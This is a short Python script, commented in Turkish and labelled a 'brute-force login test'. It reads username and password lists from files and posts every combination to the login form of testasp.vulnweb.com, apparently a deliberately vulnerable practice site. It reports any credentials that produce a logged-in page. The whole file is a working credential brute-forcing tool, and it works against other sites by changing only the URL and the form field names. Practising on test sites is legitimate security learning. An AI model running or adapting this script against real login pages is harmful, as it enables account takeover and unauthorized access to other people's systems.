import requests
from colorama import Fore, Style, init
import time

# Colorama başlatma (Windows'ta düzgün çalışması için)
init(autoreset=True)

# Dosyalardan kullanıcı adı ve şifre listelerini okuyun
with open("user.txt", "r") as user_file:
    usernames = user_file.read().splitlines()

with open("password.txt", "r") as password_file:
    passwords = password_file.read().splitlines()

# Giriş URL'si ve başarılı giriş anahtarı
url = "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F"
success_keyword = "logout"

print(Style.BRIGHT + Fore.CYAN + "\n--- Brute-force Login Test Başlatılıyor ---\n")

# Her kullanıcı adı ve şifre kombinasyonunu deneyin
for username in usernames:
    for password in passwords:
        # Form verilerini ayarlayın
        data = {
            "tfUName": username,
            "tfUPass": password
        }

        # POST isteği gönderin
        response = requests.post(url, data=data)

        # Yanıtı kontrol edin ve yanıt kodunu da ekleyin
        if success_keyword in response.text:
            print(Fore.GREEN + f"[BAŞARILI] Kullanıcı adı: {username} | Şifre: {password}")
            print(Fore.BLUE + f"Yanıt Kodu: {response.status_code}")
            print(Fore.WHITE + "Sunucudan Yanıt:\n" + response.text[:500])  # Yanıtın ilk 500 karakterini gösterir
            break  # Doğru şifre bulunduğunda döngüyü durdurur
        else:
            print(Fore.RED + f"[BAŞARISIZ] Kullanıcı adı: {username} | Şifre: {password}")
            print(Fore.YELLOW + f"Yanıt Kodu: {response.status_code}")
            print(Fore.WHITE + "Sunucudan Yanıt:\n" + response.text[:500])
            time.sleep(0.5)  # İstekler arasında kısa bir gecikme ekler

    # Kullanıcı için başarılı bir giriş bulunursa diğer şifreleri denememek için kullanıcı döngüsünü durdur
    if success_keyword in response.text:
        break

print(Style.BRIGHT + Fore.YELLOW + "\n--- Deneme tamamlandı ---")
